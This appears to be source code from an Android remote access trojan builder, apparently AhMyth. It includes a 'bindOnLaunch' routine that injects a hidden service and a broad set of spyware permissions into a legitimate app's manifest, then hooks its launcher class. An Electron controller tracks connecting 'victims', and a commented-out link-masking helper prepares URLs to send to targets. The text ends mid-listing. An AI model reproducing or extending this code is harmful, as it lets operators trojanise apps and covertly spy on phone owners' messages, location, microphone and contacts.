## New Bind on Launch function
> In the testing phases, if tests prove successful, this will be the new bindOnLaunch function, which will also make use of an Updated `copyPermissions` function as well.
```javascript
const fs = require('fs-extra');
const xml2js = require('xml2js');
const dir = require('path');
const readdirp = require('readdirp');
var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
const apkFolder = '/data/data/com.termux/files/home/flappy';

var copyPermissions = (manifest) => {
    // $appCtrl.copyPermissions = (manifest) => {
    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
    var lastPart = manifest.substring(manifest.indexOf("<application"));

    var permArray = CONSTANTS.permissions;
    for (var i = 0; i < permArray.length; i++) {
        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
        if (firstPart.indexOf(permissionName) == -1) {
            // Check if this is the first permission being added
            if (firstPart.indexOf('uses-permission') == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            } else {
                // Add the permission above the first existing permission
                var index = firstPart.indexOf('<uses-permission');
                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
            }
        }
    }

    return (firstPart + lastPart);
};

$appCtrl.BindOnLaunch = (apkFolder) => {


    delayedLog('[★] Reading the Android Manifest File...\n');
    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
        if (error) {
            delayedLog('[x] Reading the Android Manifest file Failed!\n');
            return;
        }

        delayedLog('[★] Modifying the Android Manifest File...\n');
        const ahmythService = CONSTANTS.ahmythService;
        const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
        + permManifest.substring(permManifest.indexOf('</application>'));
        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
            if (error) {
                delayedLog('[x] Modifying the Android Manifest Failed!\n', error);
                return;
            }

            xml2js.parseString(data, (err, result) => {
                if (err) {
                    console.error(err);
                    return;
                }

                delayedLog('[★] Searching for a Hookable Class in the Android Manifest...\n')
                const launcherActivity = GetLauncherActivity(result, apkFolder);
                if (launcherActivity === -1) {
                    delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
                    delayedLog('[x] Please use Another APK as a Template!.\n');
                    return;
                }

                delayedLog('[★] Locating the Hookable Smali Class File...\n');
                const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                    if (err) {
                        delayedLog('[x] Unable to Locate the Hookable Smali Class File!');
                        delayedLog('[x] Please Use the "On Boot" Method!\n');
                        return;
                    } else {
                        delayedLog('[¡] Hookable Smali Class File Found: ' + launcherPath + '\n');
                    }


                    delayedLog('[★] Reading the Hookable Smali Class File...\n');
                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Hookable Smali Class File!\n');
                            return;
                        }

                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                        var hook = CONSTANTS.hookPoint;


                        delayedLog('[★] Hooking the Smali Class File...\n');

                        var output = data.replace(hook, startService);
                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Modifying the Hookable Smali Class File Failed!\n', CONSTANTS.logStatus.FAIL);
                                return;
                            }


                            delayedLog('[★] Determining Target SDK Version...\n');
                            fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                if (error) {

                                    delayedLog('[x] Reading the Manifest Target SDK Failed.');

                                    return;
                                }


                                delayedLog('[★] Modifying the Target SDK Version...\n');


                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/

                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                .replace(compSdkVerNameRegex, "$111" + '"')
                                .replace(platVerCoRegex, "$122" + '"')
                                .replace(platVerNameRegex, "$111" + '"');

                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                    if (error) {

                                        delayedLog('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);

                                        return;
                                    }

                                    fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                        if (error) {

                                            delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!\n");

                                            return;
                                        }

                                        var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                        var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                        var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                        .replace(tarSdkRegex, "$122'");

                                        fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                            if (error) {

                                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");

                                                return;
                                            }
                                            // $appCtrl.copyAhmythFilesAndGenerateApk
                                        });
                                    });
                                });
                            });

                        });

                    });

                });

            });

        });
    });

};

function delayedLog(message) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        console.log(message);
    }, count * 1000);
};

function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...\n');
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        mainActivityClassName = mainActivityClassName.split('.').pop();
        if (mainActivityClassName.startsWith('.')) {
            mainActivityClassName = mainActivityClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity for Hooking...\n');
        return mainActivityClassName + '.smali';
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n');
        return targetActivityName + '.smali';
    }

    return -1;

}

function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
    .on('data', (entry) => {
        found = true;
        var {
            path, stats: {}
        } = entry;
        var output = `${JSON.stringify(path)}`;
        if (process.platform === 'win32') {
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
        } else {
            (process.platform === 'linux' || process.platform === 'darwin');
            launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
        }
    })
    .on('end',
        () => {
            if (!found) {
                callback('[x] Unable to Locate the Hookable Smali Class File!');
                callback('[x] Please Use the "On Boot" Method!\n');
            } else {
                callback(null, launcherPath);
            }
        })
    .on('error',
        (err) => {
            callback(err);
        });
}
```
## New 'AppCtrl.js' File
```
var app = angular.module('myapp', []);
const {
    remote
} = require('electron');
var dialog = remote.dialog;
const {
    ipcRenderer
} = require('electron');
var fs = require('fs-extra')
var victimsList = remote.require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants');
var homedir = require('node-homedir');
const {
    dirname
} = require('path');
var dir = require("path");
var exec = require('child_process').exec, child;
var xml2js = require('xml2js');
var readdirp = require('readdirp');
//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk
    //$appCtrl.permissionsCustom = method: 'BOOT'; //default value for permissions of apk
    var log = document.getElementById("log");
    $appCtrl.logs = [];
    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = remote.getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        window.maximize();
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        // notify the main proccess about the port and let him start listening
        ipcRenderer.send("SocketIO:Listen", port);
        $appCtrl.Log('[✓] Started Listening on Port: ' + port, CONSTANTS.logStatus.SUCCESS);
    }


    // fired when main proccess (main.js) sends any new notification about new victim
    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        // add the new victim to the list
        viclist[index] = victimsList.getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });


    // fired if listening brings error
    ipcRenderer.on("SocketIO:Listen", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply()
    });


    // fired when main proccess (main.js) send any new notification about disconnected victim
    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        // delete him from list
        delete viclist[index];
        $appCtrl.$apply();
    });


    // notify the main proccess (main.js) to open the lab
    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    }

    // stop listening when user clicks the Stop button
    /*
    $appCtrl.Stop = (event) => {
        ipcRenderer.removeAllListeners("SocketIO:Listen", event);
        $appCtrl.Log('[✓] Stopped listening on Port: ' + port, CONSTANTS.logStatus.SUCCESS);
    }
    */

    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;

        $appCtrl.logs.push({
            date: new Date().toLocaleString(), msg: msg, color: fontColor
        });
        log.scrollTop = log.scrollHeight;
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop(); //get the name of the apk
                $appCtrl.Log('[¡] ' + '"' + apkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                // Empty log line for space between logs
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // function to run mask python file
    /*
    $appCtrl.callmaskpy = () => {
        var targetmask = document.getElementById('targeturl').value
        var hiddenmask = document.getElementById('hiddenurl').value
        var keywordmask = "-"
        child = exec("python3 ./app/app/Factory/maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
            function (error, stdout, stderr) {
                //console.log('stdout: ' + stdout);
                //console.log('stderr: ' + stderr);
                if (error !== null) {
                    if (targetmask.length == 0) {
                        $appCtrl.Log('[x] Please Input The Desired URL To Be Hidden!', CONSTANTS.logStatus.FAIL);
                    }
                    if (hiddenmask.length == 0) {
                        $appCtrl.Log('[x] Please Input the Dedired URL To Hide Under!', CONSTANTS.logStatus.FAIL);
                    }
                    return;

                }
                if (stdout.length != 0) {
                    delayedLog('[★] Generating Link...');
                    delayedLog('[✓] Link Generated Successfully.', CONSTANTS.logStatus.SUCCESS);
                    delayedLog('[✓] Copy the URL below, then send it to your target.', CONSTANTS.logStatus.SUCCESS);
                    delayedLog('[¡] Link: ' + stdout, CONSTANTS.logStatus.INFO);

                    //console.log('exec error: ' + error);
                    return;


                }
            });
    }
    */



    // function to build the apk and sign it
    $appCtrl.GenerateApk = (apkFolder) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = CONSTANTS.permissions
        }
        //if only one selected
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            `
        }
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
